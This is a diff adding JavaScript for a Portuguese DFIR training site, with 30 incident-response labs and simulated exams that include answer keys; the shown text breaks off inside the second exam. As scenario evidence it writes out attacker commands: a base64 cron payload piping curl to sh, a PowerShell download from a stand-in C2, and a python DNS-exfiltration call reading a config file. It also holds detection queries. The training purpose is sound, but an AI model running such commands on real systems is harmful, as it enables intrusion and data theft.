+/* ===== Prova C: Abas, 30 Labs DFIR, Checklist e 3 Provas Simuladas ===== */
+(function(){
+  function esc(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+  function fmtTime(sec){
+    var h=Math.floor(sec/3600), m=Math.floor((sec%3600)/60), s=sec%60;
+    return [h,m,s].map(x=>String(x).padStart(2,"0")).join(":");
+  }
+  function dlText(filename, text){
+    var blob=new Blob([text],{type:"text/plain;charset=utf-8"});
+    var a=document.createElement("a"); a.href=URL.createObjectURL(blob); a.download=filename;
+    document.body.appendChild(a); a.click(); setTimeout(function(){ URL.revokeObjectURL(a.href); a.remove(); }, 400);
+  }
+
+  // Abas internas da Prova C + cards de atalho
+  function openProvaCTab(panelId){
+    document.querySelectorAll('#provaC .atab').forEach(x=>x.classList.toggle('active', x.dataset.cp===panelId));
+    document.querySelectorAll('#provaC .apanel').forEach(x=>x.classList.remove('active'));
+    var el=document.getElementById(panelId);
+    if(el) el.classList.add('active');
+    window.scrollTo({top:0,behavior:'smooth'});
+  }
+  document.querySelectorAll('#provaC .atab').forEach(function(t){
+    t.addEventListener('click',function(){ openProvaCTab(t.dataset.cp); });
+  });
+  document.querySelectorAll('#provaC .jumpcard').forEach(function(j){
+    j.addEventListener('click',function(){ openProvaCTab(j.dataset.cjump); });
+  });
+
+  // 30 Laboratórios interativos "Treinar" da Prova C
+  if(window.csOpenLab){
+    const BAD="⚠  Evidência de comprometimento detectada!",
+          GOOD="✅  Ação forense / contenção validada com sucesso!";
+    const CLABS = {
+      // IR Linux (9)
+      "ir-lin-auth": {title:"Logs de Autenticação Linux (SSH Brute Force)", prompt:"ir@linux:~# ",
+        cmd:"grep -E 'Failed password|Accepted' /var/log/auth.log | tail -4",
+        vuln:"Nov 24 02:11:04 sshd: Failed password for deploy from 198.51.100.44 (x412)\nNov 24 02:11:09 sshd: Accepted password for deploy from 198.51.100.44 port 51922",
+        fix:"usermod -L deploy && firewall-cmd --add-rich-rule='rule family=ipv4 source address=198.51.100.44 drop' --permanent",
+        safe:"Conta 'deploy' bloqueada (usermod -L) e IP 198.51.100.44 bloqueado no firewalld",
+        key:["usermod","passwd -l","firewall-cmd","198.51.100.44","drop","block"]},
+      "ir-lin-last": {title:"Sessões Ativas e Registros Binários (last / lastlog)", prompt:"ir@linux:~# ",
+        cmd:"w; lastlog | grep -v 'Never'",
+        vuln:"apache   pts/2   198.51.100.44   02:15   still logged in  (conta de serviço com shell interativo!)",
+        fix:"pkill -KILL -u apache; usermod -s /sbin/nologin apache",
+        safe:"Sessão maliciosa encerrada e shell da conta 'apache' restaurado para /sbin/nologin",
+        key:["pkill","kill","nologin","usermod"]},
+      "ir-lin-web": {title:"Análise de Logs Web (Upload e Uso de Webshell)", prompt:"ir@linux:~# ",
+        cmd:"grep '/uploads/' /var/log/httpd/access_log | grep ' 200 '",
+        vuln:"198.51.100.44 - [24/Nov/2026:02:18:10] \"POST /upload.php HTTP/1.1\" 200\n198.51.100.44 - [24/Nov/2026:02:18:44] \"GET /uploads/avatar.php?id=1 HTTP/1.1\" 200",
+        fix:"cp /var/www/html/uploads/avatar.php /root/ir_case/ && sha256sum /root/ir_case/avatar.php && rm -f /var/www/html/uploads/avatar.php",
+        safe:"Amostra copiada com hash SHA-256 registrado e webshell removida de /uploads/",
+        key:["sha256sum","rm","avatar.php","cp"]},
+      "ir-lin-proc": {title:"Processo em Memória com Binário Deletado (/proc)", prompt:"ir@linux:~# ",
+        cmd:"ss -tupn | grep ESTAB; ls -la /proc/4412/exe",
+        vuln:"ESTAB 10.8.8.2:49112 -> 198.51.100.44:4444 users:((\".sync\",pid=4412))\n/proc/4412/exe -> /dev/shm/.sync (deleted)",
+        fix:"cp /proc/4412/exe /root/ir_case/pid4412.bin && sha256sum /root/ir_case/pid4412.bin && kill -9 4412",
+        safe:"Binário recuperado da RAM (/proc/4412/exe), hash SHA-256 salvo e processo 4412 encerrado",
+        key:["/proc/4412/exe","sha256sum","kill","4412"]},
+      "ir-lin-pers": {title:"Caça a Persistência no Linux (Cron & SSH Keys)", prompt:"ir@linux:~# ",
+        cmd:"cat /var/spool/cron/root; tail -1 /root/.ssh/authorized_keys",
+        vuln:"*/5 * * * * /usr/local/bin/.dbus-helper\nssh-ed25519 AAAAC3Nza... attacker@kali",
+        fix:"crontab -r -u root (ou remover linha maliciosa) && sed -i '/attacker@kali/d' /root/.ssh/authorized_keys && rm -f /usr/local/bin/.dbus-helper",
+        safe:"Tarefa cron oculta, binário e chave SSH intrusa removidos com segurança",
+        key:["crontab","authorized_keys","rm","sed",".dbus-helper"]},
+      "ir-lin-time": {title:"Detecção de Timestomping com stat / find", prompt:"ir@linux:~# ",
+        cmd:"stat /var/www/html/includes/helper.php",
+        vuln:"Modify: 2022-05-01 10:00:00 (falsificado!)\nChange: 2026-11-24 03:14:22 (inode alterado na madrugada!)",
+        fix:"find /var/www -type f -ctime -1; sha256sum /var/www/html/includes/helper.php",
+        safe:"Todos os arquivos alterados nas últimas 24h mapeados por -ctime e hasheados para erradicação",
+        key:["find","-ctime","sha256sum","stat"]},
+      "ir-lin-hist": {title:"Histórico de Comandos e Anti-Forense (.bash_history)", prompt:"ir@linux:~# ",
+        cmd:"ls -la /home/deploy/.bash_history",
+        vuln:"lrwxrwxrwx 1 deploy deploy 9 Nov 24 02:25 .bash_history -> /dev/null  (anti-forense detectado!)",
+        fix:"rm -f /home/deploy/.bash_history && touch /home/deploy/.bash_history && chmod 600 /home/deploy/.bash_history",
+        safe:"Link para /dev/null registrado como evidência de evasão e arquivo regular restaurado (600)",
+        key:["rm","touch","chmod",".bash_history"]},
+      "ir-lin-audit": {title:"Reconstrução de Comandos pelo Kernel (ausearch)", prompt:"ir@linux:~# ",
+        cmd:"ausearch -k sudoers_changes -i | tail -3",
+        vuln:"type=SYSCALL msg=audit(24/11/2026 02:19:01): auid=deploy uid=root exe=/usr/bin/visudo key=sudoers_changes",
+        fix:"visudo -c && revisar /etc/sudoers.d/ removendo regra indevida adicionada por 'deploy'",
+        safe:"Regra maliciosa removida do sudoers e integridade validada com visudo -c",
+        key:["visudo","sudoers","ausearch"]},
+      "ir-lin-cont": {title:"Sequência Completa de Contenção no Linux", prompt:"ir@linux:~# ",
+        cmd:"ps -ef | grep .beacon; ss -tupn | grep 198.51.100.44",
+        vuln:"root 5190 1 /tmp/.beacon -> ESTAB 198.51.100.44:8443 (exfiltração em andamento!)",
+        fix:"cp /tmp/.beacon /root/ir_case/ && sha256sum /root/ir_case/.beacon && firewall-cmd --add-rich-rule='rule family=ipv4 source address=198.51.100.44 drop' && kill -9 5190",
+        safe:"1º Amostra + hash preservados · 2º C2 bloqueado no firewall · 3º Processo 5190 finalizado",
+        key:["sha256sum","firewall-cmd","kill"]},
+
+      // IR Windows (7)
+      "ir-win-logon": {title:"Investigação de Logon e Força Bruta (4625 / 4624)", prompt:"PS C:\\IR> ",
+        cmd:"Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625,4624} -MaxEvents 5",
+        vuln:"4625 (x85) Account: admin_fin Source: 203.0.113.77\n4624 Logon Type: 10 (RDP) Account: admin_fin Source: 203.0.113.77",
+        fix:"Disable-ADAccount -Identity admin_fin; New-NetFirewallRule -DisplayName 'Block Attacker' -RemoteAddress 203.0.113.77 -Action Block",
+        safe:"Conta admin_fin suspensa e IP 203.0.113.77 bloqueado no Windows Firewall",
+        key:["disable-adaccount","disable-localuser","new-netfirewallrule","203.0.113.77","block"]},
+      "ir-win-acct": {title:"Conta Backdoor (4720) e Limpeza de Log (1102)", prompt:"PS C:\\IR> ",
+        cmd:"Get-WinEvent -FilterHashtable @{LogName='Security';Id=4720,4732,1102}",
+        vuln:"4720: User 'svc_support$' created · 4732: Added to 'Administrators' · 1102: Audit log cleared!",
+        fix:"Disable-LocalUser -Name 'svc_support$'; Remove-LocalGroupMember -Group 'Administrators' -Member 'svc_support$'",
+        safe:"Conta backdoor 'svc_support$' removida de Administrators e desativada (preservada para perícia)",
+        key:["disable-localuser","remove-localgroupmember","svc_support"]},
+      "ir-win-ps": {title:"PowerShell Ofuscado (Event ID 4104)", prompt:"PS C:\\IR> ",
+        cmd:"Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 1",
+        vuln:"ScriptBlockText: (New-Object Net.WebClient).DownloadFile('http://203.0.113.77/upd.exe','C:\\ProgramData\\upd.exe')",
+        fix:"Get-FileHash C:\\ProgramData\\upd.exe -Algorithm SHA256; New-NetFirewallRule -DisplayName 'Block C2' -Direction Outbound -RemoteAddress 203.0.113.77 -Action Block",
+        safe:"Hash SHA-256 de C:\\ProgramData\\upd.exe coletado e saída para 203.0.113.77 bloqueada",
+        key:["get-filehash","sha256","new-netfirewallrule","203.0.113.77"]},
+      "ir-win-sysmon": {title:"Telemetria Sysmon (ID 1 Processo + ID 3 Rede)", prompt:"PS C:\\IR> ",
+        cmd:"Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1,3} -MaxEvents 2",
+        vuln:"Sysmon ID 1: ParentImage=w3wp.exe -> Image=C:\\ProgramData\\upd.exe (PID 6240)\nSysmon ID 3: Image=C:\\ProgramData\\upd.exe -> DestinationIp=203.0.113.77:443",
+        fix:"Stop-Process -Id 6240 -Force; Get-FileHash C:\\ProgramData\\upd.exe -Algorithm SHA256",
+        safe:"Processo malicioso 6240 encerrado e hash SHA-256 documentado para bloqueio no EDR/SIEM",
+        key:["stop-process","6240","get-filehash"]},
+      "ir-win-pers": {title:"Persistência Windows (Serviço 7045 e Chave Run)", prompt:"PS C:\\IR> ",
+        cmd:"Get-WinEvent -FilterHashtable @{LogName='System';Id=7045} -MaxEvents 1",
+        vuln:"7045 New Service: ServiceName=WinUpdaterSvc · ImagePath=C:\\ProgramData\\upd.exe · StartType=auto",
+        fix:"Stop-Service -Name WinUpdaterSvc -Force; sc.exe delete WinUpdaterSvc",
+        safe:"Serviço persistente WinUpdaterSvc parado e removido do Registro de Serviços",
+        key:["stop-service","sc.exe","delete","winupdatersvc"]},
+      "ir-win-net": {title:"Assinatura Digital e Artefatos Prefetch", prompt:"PS C:\\IR> ",
+        cmd:"Get-AuthenticodeSignature C:\\ProgramData\\upd.exe; Get-ChildItem C:\\Windows\\Prefetch\\UPD.EXE*.pf",
+        vuln:"Status: NotSigned  ·  Prefetch: UPD.EXE-8A12F901.pf (LastWriteTime: 24/11/2026 02:40:11)",
+        fix:"Copy-Item C:\\Windows\\Prefetch\\UPD.EXE*.pf C:\\IR_Case\\; Get-FileHash C:\\ProgramData\\upd.exe -Algorithm SHA256",
+        safe:"Artefato Prefetch e hash SHA-256 preservados como prova de execução na linha do tempo",
+        key:["copy-item","get-filehash","prefetch","sha256"]},
+      "ir-win-cont": {title:"Contenção Completa em Host Windows", prompt:"PS C:\\IR> ",
+        cmd:"Get-NetTCPConnection -State Established | Where-Object RemoteAddress -eq '203.0.113.77'",
+        vuln:"LocalPort 50412 -> RemoteAddress 203.0.113.77:443 State=Established OwningProcess=6240",
+        fix:"Get-FileHash C:\\ProgramData\\upd.exe; New-NetFirewallRule -DisplayName 'BlockC2' -Direction Outbound -RemoteAddress 203.0.113.77 -Action Block; Stop-Process -Id 6240 -Force",
+        safe:"Evidência hasheada, tráfego C2 bloqueado no firewall e processo 6240 finalizado",
+        key:["get-filehash","new-netfirewallrule","stop-process"]},
+
+      // Rede, PCAP & SIEM (8)
+      "ir-net-tshark": {title:"Triagem de Conversas em PCAP com tshark", prompt:"analyst@dfir:~$ ",
+        cmd:"tshark -r incidente.pcap -q -z conv,ip | head -5",
+        vuln:"10.8.8.2 <-> 198.51.100.44   Frames: 18.420   Bytes: 94 MB   Duration: 1820s",
+        fix:"tshark -r incidente.pcap -Y 'ip.addr == 198.51.100.44' -w fluxo_suspeito.pcap",
+        safe:"Fluxo suspeito de 94 MB isolado em fluxo_suspeito.pcap para inspeção detalhada",
+        key:["tshark","ip.addr","198.51.100.44"]},
+      "ir-net-scan": {title:"Identificação de Port Scan em PCAP", prompt:"analyst@dfir:~$ ",
+        cmd:"tshark -r incidente.pcap -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' -T fields -e ip.src | sort | uniq -c",
+        vuln:"   1024 198.51.100.44   (varredura SYN em 1024 portas em 3 segundos!)",
+        fix:"tshark -r incidente.pcap -Y 'ip.src==198.51.100.44 && tcp.flags.syn==1' -T fields -e frame.time | head -1",
+        safe:"Timestamp inicial do reconhecimento registrado em UTC: 2026-11-24T02:09:12Z (IOC: 198.51.100.44)",
+        key:["tshark","frame.time","tcp.flags","198.51.100.44"]},
+      "ir-net-http": {title:"Extração de Objetos HTTP de PCAP + SHA-256", prompt:"analyst@dfir:~$ ",
+        cmd:"tshark -r incidente.pcap -Y 'http.request' -T fields -e http.request.method -e http.request.full_uri",
+        vuln:"GET http://198.51.100.44:8080/stage2.elf",
+        fix:"tshark -r incidente.pcap --export-objects http,./extraidos/ && sha256sum ./extraidos/stage2.elf",
+        safe:"stage2.elf extraído do PCAP · SHA-256: e3b0c44298fc1c149afbf4c8996fb924... documentado",
+        key:["--export-objects","export","sha256sum","stage2"]},
+      "ir-net-dns": {title:"Detecção e Decodificação de DNS Tunneling", prompt:"analyst@dfir:~$ ",
+        cmd:"tshark -r incidente.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name | head -3",
+        vuln:"53454e48415f4442.c2-evil.net\n5f50524f445f32303236.c2-evil.net   (exfiltração em Hex via DNS!)",
+        fix:"tshark -r incidente.pcap -Y 'dns.qry.name contains c2-evil.net' -T fields -e dns.qry.name | cut -d. -f1 | xxd -r -p",
+        safe:"Conteúdo exfiltrado reconstruído ('SENHA_DB_PROD_2026') — domínio c2-evil.net bloqueado e credencial rotacionada!",
+        key:["xxd","c2-evil.net","dns.qry.name","cut"]},
+      "ir-net-beacon": {title:"Correlação de Beaconing C2 e Suricata eve.json", prompt:"analyst@dfir:~$ ",
+        cmd:"jq 'select(.event_type==\"alert\") | .alert.signature, .dest_ip' /var/log/suricata/eve.json",
+        vuln:"\"ET MALWARE CobaltStrike/C2 Beacon Activity\"\n\"198.51.100.44\"",
+        fix:"firewall-cmd --add-rich-rule='rule family=ipv4 destination address=198.51.100.44 drop' --permanent && firewall-cmd --reload",
+        safe:"Tráfego de saída para o C2 198.51.100.44 bloqueado e host interno encaminhado para contenção",
+        key:["firewall-cmd","198.51.100.44","drop","block","jq"]},
+      "ir-net-ids": {title:"Correlação de Logs de Firewall (Egress / Reverse Shell)", prompt:"analyst@dfir:~$ ",
+        cmd:"grep '198.51.100.44' /var/log/firewall.log",
+        vuln:"PASS out tcp 10.8.8.2:53110 -> 198.51.100.44:4444   (servidor interno abriu shell reverso!)",
+        fix:"Bloquear saída DMZ -> Any no firewall e investigar o processo ativo no host 10.8.8.2 com ss -tupn",
+        safe:"Saída arbitrária bloqueada no firewall e PID responsável identificado em 10.8.8.2",
+        key:["block","bloquear","ss","10.8.8.2","4444","firewall"]},
+      "ir-net-siem": {title:"Consulta de Threat Hunting no SIEM (KQL / SPL)", prompt:"siem-query > ",
+        cmd:"(Alerta: atividade suspeita no servidor web IIS)",
+        vuln:"Milhares de eventos misturados — necessário filtrar processos filhos de w3wp.exe ou PowerShell codificado",
+        fix:"ParentImage:\"*w3wp.exe\" OR process.command_line:(*-enc* OR *DownloadString*)",
+        safe:"3 eventos críticos isolados: w3wp.exe -> powershell.exe -enc ... no host SRV-WEB02 às 02:31Z",
+        key:["w3wp","parentimage","command_line","-enc","4688","eventcode"]},
+      "ir-net-phish": {title:"Análise Forense de E-mail de Phishing (.eml)", prompt:"analyst@dfir:~$ ",
+        cmd:"grep -Ei '^(From|Return-Path|Authentication-Results):' alerta_rh.eml",
+        vuln:"From: RH Corporativo <rh@empresa.com.br>\nReturn-Path: <mailer@portal-beneficios-urgente.xyz>\nAuthentication-Results: spf=fail dmarc=fail",
+        fix:"grep -Eo 'https?://[^\">\\s]+' alerta_rh.eml && bloquear domínio portal-beneficios-urgente.xyz no gateway/proxy e expurgar caixas",
+        safe:"URL maliciosa extraída sem clique, domínio bloqueado no proxy/e-mail e busca no SIEM por quem clicou",
+        key:["grep","portal-beneficios","bloquear","proxy","spf"]},
+
+      // Memória, Disco & Artefatos (6)
+      "ir-for-acq": {title:"Preservação Forense e Montagem Read-Only", prompt:"root@forense:~# ",
+        cmd:"ls -lh disco_evidencia.img",
+        vuln:"disco_evidencia.img (sem hash registrado e prestes a ser montado sem proteção!)",
+        fix:"sha256sum disco_evidencia.img > evidencia.sha256 && cp disco_evidencia.img copia.img && mount -o ro,loop,noexec copia.img /mnt/forense",
+        safe:"Hash original salvo, cópia validada e montada em /mnt/forense com ro,loop,noexec (integridade 100%)",
+        key:["sha256sum","ro","noexec","mount"]},
+      "ir-for-vol": {title:"Forense de Memória RAM com Volatility 3", prompt:"analyst@dfir:~$ ",
+        cmd:"vol -f memdump.raw windows.pstree | grep -A2 explorer.exe",
+        vuln:"* 2104 explorer.exe\n** 3892 notepad.exe  (conectado a 203.0.113.77:443 no netscan!)",
+        fix:"vol -f memdump.raw windows.malfind --pid 3892 --dump",
+        safe:"Região PAGE_EXECUTE_READWRITE com cabeçalho MZ detectada e extraída do PID 3892 para cálculo de hash",
+        key:["vol","malfind","3892","netscan","cmdline","pslist"]},
+      "ir-for-tsk": {title:"Recuperação de Arquivo Deletado (Sleuth Kit fls / icat)", prompt:"analyst@dfir:~$ ",
+        cmd:"fls -r -d -o 2048 copia.img",
+        vuln:"r/r * 1842:\t/home/deploy/exfil_clientes.zip   (arquivo apagado pelo invasor!)",
+        fix:"icat -o 2048 copia.img 1842 > recuperado.zip && sha256sum recuperado.zip",
+        safe:"exfil_clientes.zip recuperado integralmente pelo inode 1842 e hash SHA-256 registrado",
+        key:["icat","1842","sha256sum"]},
+      "ir-for-stat": {title:"Triagem Estática de Arquivo Suspeito (file / strings)", prompt:"analyst@dfir:~$ ",
+        cmd:"file comprovante.pdf",
+        vuln:"comprovante.pdf: ELF 64-bit LSB pie executable, x86-64 (binário executável disfarçado de PDF!)",
+        fix:"sha256sum comprovante.pdf && strings -n 6 comprovante.pdf | grep -Ei 'http|([0-9]{1,3}\\.){3}[0-9]{1,3}'",
+        safe:"IOCs extraídos sem executar: SHA-256 calculado e URL C2 http://198.51.100.44:8080/gate revelada",
+        key:["sha256sum","strings"]},
+      "ir-for-deobf": {title:"Desofuscação Defensiva Segura (Base64)", prompt:"analyst@dfir:~$ ",
+        cmd:"cat /etc/cron.d/sync_check",
+        vuln:"*/10 * * * * root echo Y3VybCAtcyBodHRwOi8vMTk4LjUxLjEwMC40NC9iZWFjb24= | base64 -d | sh",
+        fix:"echo Y3VybCAtcyBodHRwOi8vMTk4LjUxLjEwMC40NC9iZWFjb24= | base64 -d",
+        safe:"Decodificado com segurança (sem '| sh'): 'curl -s http://198.51.100.44/beacon' — IOC extraído!",
+        key:["base64 -d","base64 --decode"]},
+      "ir-for-yara": {title:"Varredura de Persistência Oculta com YARA", prompt:"analyst@dfir:~$ ",
+        cmd:"cat regra_c2.yar",
+        vuln:"rule C2_Webshell { strings: $a = \"c2-evil.net\" condition: $a }  (falta varrer os diretórios web!)",
+        fix:"yara -r regra_c2.yar /var/www /tmp",
+        safe:"C2_Webshell /var/www/html/assets/.thumb.php — segunda webshell oculta localizada e removida!",
+        key:["yara","-r","/var/www"]}
+    };
+
+    const STORE_C = "cs_provaC_done_v1";
+    let doneC = {};
+    try { doneC = JSON.parse(localStorage.getItem(STORE_C) || "{}"); } catch(e){ doneC = {}; }
+
+    const btnsC = Array.from(document.querySelectorAll('#provaC .trainbtn[data-clab]'));
+    const totC = btnsC.length;
+    const progTxtC = document.getElementById("cProgTxt");
+    const progBarC = document.getElementById("cProgBar");
+
+    function refreshProgC(){
+      let n = 0;
+      btnsC.forEach(function(b){
+        const id = b.dataset.clab;
+        if(doneC[id]){
+          n++;
+          b.classList.add("done");
+          b.textContent = "✅ Treinado (repetir)";
+        } else {
+          b.classList.remove("done");
+          b.textContent = "🎮 Treinar";
+        }
+      });
+      if(progTxtC) progTxtC.textContent = n + " / " + totC;
+      if(progBarC) progBarC.style.width = (totC ? Math.round((n/totC)*100) : 0) + "%";
+    }
+
+    btnsC.forEach(function(b){
+      const id = b.dataset.clab;
+      const s = CLABS[id];
+      if(!s) return;
+      b.addEventListener("click", function(e){
+        e.stopPropagation();
+        const scn = Object.assign({}, s, {
+          badMsg: BAD,
+          goodMsg: GOOD,
+          onDone: function(){
+            doneC[id] = 1;
+            try { localStorage.setItem(STORE_C, JSON.stringify(doneC)); } catch(err){}
+            refreshProgC();
+          }
+        });
+        window.csOpenLab(scn, s.title, false);
+      });
+    });
+    refreshProgC();
+  }
+
+  // Checklist interativo da Prova C
+  const CCHK_KEY = "cs_provaC_chk_v1";
+  let cchk = {};
+  try { cchk = JSON.parse(localStorage.getItem(CCHK_KEY) || "{}"); } catch(e){ cchk = {}; }
+  const cchkBoxes = Array.from(document.querySelectorAll('#cChkList input[type="checkbox"]'));
+  const cchkCount = document.getElementById("cChkCount");
+  function refreshCChk(){
+    let n = 0;
+    cchkBoxes.forEach(function(cb){
+      const on = !!cchk[cb.dataset.cchk];
+      cb.checked = on;
+      cb.closest(".chkitem").classList.toggle("checked", on);
+      if(on) n++;
+    });
+    if(cchkCount) cchkCount.textContent = n + "/" + cchkBoxes.length;
+  }
+  cchkBoxes.forEach(function(cb){
+    cb.addEventListener("change", function(){
+      cchk[cb.dataset.cchk] = cb.checked ? 1 : 0;
+      try { localStorage.setItem(CCHK_KEY, JSON.stringify(cchk)); } catch(err){}
+      refreshCChk();
+    });
+  });
+  refreshCChk();
+
+  /* ===================== ARENA DE 3 PROVAS SIMULADAS — PROVA C (DFIR / SOC) ===================== */
+  const EXAMS_C = [
+    {
+      id:"c1", num:"Prova C1", tag:"IR Linux + Rede · 2h30", duration:9000,
+      title:"Invasão em Servidor Linux (Força Bruta SSH → Persistência → Exfiltração)",
+      summary:"O SOC recebeu um alerta de tráfego anômalo de saída no servidor srv-app01. Investigue terminal, logs e captura de rede para responder às 5 questões periciais e conter o incidente.",
+      brief:"Às 03:20 UTC, o firewall detectou envio incomum de dados a partir do servidor Linux 'srv-app01' (10.10.20.15). Você está conectado em modo de resposta a incidentes. Analise as evidências nas 3 abas abaixo, descubra exatamente o que ocorreu e preencha o Relatório de Resposta a Incidentes.",
+      prompt:"ir@srv-app01:~# ",
+      refCmds:["help","ss -tupn","ls -la /proc/4812/exe","cat /var/spool/cron/root","sha256sum /dev/shm/.kworker_sync"],
+      commands:{
+        "help":"Comandos forenses disponíveis neste host (digite manualmente):\n  ss -tupn                           · listar conexões de rede ativas e PID\n  ls -la /proc/4812/exe              · inspecionar executável real do PID suspeito\n  cat /var/spool/cron/root           · verificar tarefas agendadas de root\n  sha256sum /dev/shm/.kworker_sync   · calcular hash SHA-256 do artefato suspeito",
+        "ss -tupn":{
+          out:"Netid State  Local Address:Port   Peer Address:Port     Process\ntcp   ESTAB  10.10.20.15:22       10.10.99.5:51200      users:((\"sshd\",pid=5010))\ntcp   ESTAB  10.10.20.15:48990    185.220.101.33:8443   users:((\".kworker_sync\",pid=4812))",
+          ev:"C2 Ativo: PID 4812 (.kworker_sync) conectado a 185.220.101.33:8443", cls:"bad"
+        },
+        "ls -la /proc/4812/exe":{
+          out:"lrwxrwxrwx 1 root root 0 Nov 24 03:05 /proc/4812/exe -> /dev/shm/.kworker_sync",
+          ev:"Binário malicioso localizado em /dev/shm/.kworker_sync", cls:"bad"
+        },
+        "cat /var/spool/cron/root":{
+          out:"*/5 * * * * /dev/shm/.kworker_sync --c2 185.220.101.33:8443",
+          ev:"Persistência: cron de root executando /dev/shm/.kworker_sync a cada 5 min", cls:"bad"
+        },
+        "sha256sum /dev/shm/.kworker_sync":{
+          out:"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08  /dev/shm/.kworker_sync",
+          ev:"SHA-256 do artefato: 9f86d081884c7d65...00a08", cls:"warn"
+        }
+      },
+      logsDoc:[
+        {
+          name:"/var/log/auth.log (Trecho relevante em UTC)",
+          text:"2026-11-24T02:58:11Z srv-app01 sshd[4601]: Failed password for backup_ops from 45.133.12.90 port 39102 ssh2 (x318 tentativas)\n2026-11-24T03:01:44Z srv-app01 sshd[4790]: Accepted password for backup_ops from 45.133.12.90 port 44210 ssh2\n2026-11-24T03:03:12Z srv-app01 sudo: backup_ops : TTY=pts/0 ; PWD=/home/backup_ops ; USER=root ; COMMAND=/usr/bin/bash\n2026-11-24T03:05:02Z srv-app01 crontab[4809]: (root) REPLACE (root)",
+          ev:"Acesso inicial: força bruta SSH de 45.133.12.90 na conta backup_ops às 03:01:44Z + sudo bash"
+        }
+      ],
+      pcapDoc:[
+        {
+          name:"Resumo tshark (captura_perimetro.pcap)",
+          text:"1) 02:58:10Z - 03:01:44Z | 45.133.12.90 -> 10.10.20.15:22   | 319 fluxos TCP (SSH Brute Force)\n2) 03:04:19Z             | 10.10.20.15 -> 185.220.101.33:80 | GET /drop/kworker_sync (Download do agente)\n3) 03:05:05Z - 03:20:05Z | 10.10.20.15 -> 185.220.101.33:8443 | TLS Beaconing + Upload de 68 MB (/var/backups/clientes.sql.gz)",
+          ev:"Exfiltração de 68 MB para o C2 185.220.101.33:8443"
+        }
+      ],
+      questions:[
+        {q:"1. Qual foi o IP de origem do acesso inicial (força bruta SSH)?", placeholder:"Digite o IPv4...", keys:["45.133.12.90"]},
+        {q:"2. Qual conta de usuário foi comprometida no acesso inicial e qual timestamp UTC do login aceito?", placeholder:"Ex.: usuario - 00:00:00Z", keys:["backup_ops","03:01:44"], minHits:2},
+        {q:"3. Qual mecanismo de persistência e caminho do artefato foram deixados pelo invasor?", placeholder:"Ex.: local da persistência e caminho do binário", keys:["cron","/dev/shm/.kworker_sync"], minHits:2},
+        {q:"4. Qual o IP:porta do servidor C2 para onde os dados foram exfiltrados e os 8 primeiros caracteres do SHA-256 do malware?", placeholder:"Ex.: IP:porta e início do hash", keys:["185.220.101.33","9f86d081"], minHits:2},
+        {q:"5. Descreva a sequência correta de contenção e erradicação para este servidor:", placeholder:"Preservação, firewall, conta, processo, cron e SSH...", keys:["firewall","backup_ops","4812","cron"], minHits:3}
+      ]
+    },
+    {
+      id:"c2", num:"Prova C2", tag:"Web + RAM + DNS Tunnel · 2h30", duration:9000,
+      title:"Web Breach, Memória RAM & Exfiltração por DNS Tunneling",
+      summary:"O servidor web 'portal-prd' disparou alertas de consultas DNS anômalas. Investigue o dump de memória (Volatility 3), o access_log e a captura DNS.",
+      brief:"O sensor NDR detectou centenas de consultas DNS incomuns partindo do servidor 'portal-prd' (10.20.30.10). Uma coleta de memória RAM (portal_ram.raw) e um PCAP já estão prontos na estação pericial. Descubra o vetor de entrada, o processo em memória, decodifique o segredo vazado via DNS e defina a contenção.",
+      prompt:"dfir@workstation:~$ ",
+      refCmds:["help","vol -f portal_ram.raw linux.pstree","vol -f portal_ram.raw linux.cmdline","echo 43484156455f5049585f393931 | xxd -r -p","stat /var/www/html/uploads/logo_novo.php"],
+      commands:{
+        "help":"Comandos disponíveis na estação forense (digite manualmente):\n  vol -f portal_ram.raw linux.pstree          · árvore de processos no dump de RAM\n  vol -f portal_ram.raw linux.cmdline         · argumentos de linha de comando na RAM\n  echo 43484156455f5049585f393931 | xxd -r -p · decodificar carga Hex extraída do DNS\n  stat /var/www/html/uploads/logo_novo.php    · checar timestamps (mtime vs ctime)",
+        "vol -f portal_ram.raw linux.pstree":{
+          out:"* 1120 httpd\n** 1124 httpd (apache)\n*** 6310 python3   <-- PROCESSO FILHO ANÔMALO DO APACHE!",
+          ev:"RAM (Volatility 3): httpd gerou processo filho python3 (PID 6310)", cls:"bad"
+        },
+        "vol -f portal_ram.raw linux.cmdline":{
+          out:"PID 6310: python3 -c \"import os... exfil_dns('/etc/portal/api.conf', 'telemetry-sync.org')\"",
+          ev:"Cmdline PID 6310: script Python exfiltrando /etc/portal/api.conf para telemetry-sync.org", cls:"bad"
+        },
+        "echo 43484156455f5049585f393931 | xxd -r -p":{
+          out:"CHAVE_PIX_991",
+          ev:"Dado exfiltrado decodificado do DNS: CHAVE_PIX_991", cls:"warn"
+        },
+        "stat /var/www/html/uploads/logo_novo.php":{
+          out:"File: /var/www/html/uploads/logo_novo.php\nModify: 2021-08-15 09:00:00 (Timestomping!)\nChange: 2026-11-24 04:12:08 UTC",
+          ev:"Webshell com timestomping em /uploads/logo_novo.php (ctime real 04:12:08Z)", cls:"bad"
+        }
+      },
+      logsDoc:[
+        {
+          name:"/var/log/httpd/access_log + Suricata eve.json",
+          text:"192.0.2.88 - [24/Nov/2026:04:12:08 +0000] \"POST /painel/upload_logo.php HTTP/1.1\" 200 412\n192.0.2.88 - [24/Nov/2026:04:12:35 +0000] \"POST /uploads/logo_novo.php HTTP/1.1\" 200 128\n[Suricata ALERT 04:13:02Z] ET DNS Query to Suspicious TLD / Excessive Subdomain Length -> telemetry-sync.org",
+          ev:"Upload de webshell logo_novo.php por 192.0.2.88 às 04:12:08Z"
+        }
+      ],
+      pcapDoc:[
+        {
+          name:"Consultas DNS capturadas (tshark dns.qry.name)",
+          text:"04:13:01Z  10.20.30.10 -> DNS  TXT  43484156455f5049585f393931.telemetry-sync.org\n(Subdomínio em Hexadecimal carregando o segredo lido de /etc/portal/api.conf)",
+          ev:"DNS Tunneling para o domínio telemetry-sync.org (subdomínio Hex)"
+        }
+      ],
+      questions:[
